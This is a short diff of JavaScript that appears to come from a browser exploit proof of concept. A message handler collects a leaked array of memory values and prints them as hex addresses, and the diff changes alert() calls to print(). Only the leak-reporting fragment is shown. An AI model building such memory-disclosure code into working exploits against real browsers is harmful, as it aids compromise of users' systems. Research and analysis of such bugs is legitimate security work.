@@ -60,7 +60,7 @@ await sleep(500);
 let is_leak = true;
 originNode2.port.onmessage = async (e)=>{
     if(e.data == "retry"){
-	    alert("failed");
+	    print("failed");
                     //print(e.data);
                     //await sleep(2000);
         location.reload();
@@ -76,7 +76,7 @@ var leak = e.data;
                 
 for(var i = 0; i < leak.length; i ++){
     if(leak[i] != 0)
-    alert(`[${i}] : ` + floatAsQword(leak[i]).toString(16));
+    print(`[${i}] : ` + floatAsQword(leak[i]).toString(16));
 }
 is_leak = false;
                 //await audioCtx.suspend(audioCtx.currentTime+ 0.01);
